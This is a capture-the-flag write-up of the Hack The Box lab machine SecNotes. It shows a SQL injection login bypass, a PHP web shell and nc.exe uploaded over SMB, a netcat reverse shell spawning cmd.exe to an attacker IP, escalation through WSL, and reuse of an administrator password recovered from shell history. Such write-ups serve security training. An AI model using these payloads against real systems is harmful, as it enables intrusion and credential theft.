---
title: "HTB SecNotes"
permalink: /writeups/secnotes
location: default
---

# HTB SecNotes

**Machine Information**

	IP : 10.10.10.97
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.97 -- -sC -sV
```

This should reveal three open ports: `80`, `445`, and `8808`.

```
PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Getting a Foothold

**SQL Injection**

We are able to create an account on the website but it doesn't reveal much. After a bit of testing the account creation page has a SQL injection vulnerability. Create a new account with the username:

```
' or 1='1
```

When you sign in it will return the notes for all users and reveal the password for `tyler`. Use these credentials to connect to the SMB share `new-site`.

```
smbclient -U tyler \\\\10.10.10.97\\new-site
```

The share shows some IIS files which indicate this is likely the IIS web server directory. This can be confirmed by opening the file `iisstart.png` in a browser.

<http://10.10.10.97:8808/iisstart.png>

Upload a web shell and the `nc.exe` binary using the SMB share.

```
put php_cmd.php
put nc.exe
```

Once both are uploaded start a new `netcat` listener and create a reverse shell using the web shell.

```
http://10.10.10.97:8808/php_cmd.php?cmd=nc.exe%2010.10.14.4%209001%20-e%20cmd.exe%2010.10.14.16%209001
```

Success!

```
C:\inetpub\new-site>whoami
secnotes\tyler
```

The user flag can be found in the following directory:

```
C:\Users\tyler\Desktop\user.txt
```

### Privilege Escalation

During enumeration as `wsl.exe` binary was identified.

```
where /R c:\windows wsl.exe
```

```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```

Run it to get a root shell in the WSL environment.

```
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```

**Upgrade Shell**

Use the python one liner to upgrade our shell.

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

**History**

Check the user history to find the Administrator password.

```
history
```

Use the `smbclient` command found in history to escape the WSL environment and connect to the SMB share as the Administrator.

```
smbclient -U 'administrator%<PASSWORD>' \\\\127.0.0.1\\c$
```

The root flag can be found in the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
